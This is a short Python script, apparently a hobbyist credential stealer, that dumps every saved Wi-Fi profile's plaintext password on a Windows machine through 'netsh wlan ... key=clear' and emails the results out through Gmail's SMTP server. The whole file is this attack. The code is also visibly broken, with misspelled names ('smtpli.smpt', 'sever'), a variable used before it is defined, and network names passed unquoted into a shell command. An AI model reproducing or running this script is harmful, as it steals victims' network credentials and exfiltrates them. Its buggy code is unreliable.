#!/usr/bin/python

import subprocess, smtplib, re

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output= ""
for network in network_list:
	command="netsh wlan show profile " + network + " key=clear"
	one_network_result=subprocess.check_output(command, shell=True)
	final_output += one_network_result
server =smtpli.smpt("smtp.gmail.com",587)
sever.starttls()
server.login(email,password)
server.sendmail(my_email, my_email, final_output)
server.quit()
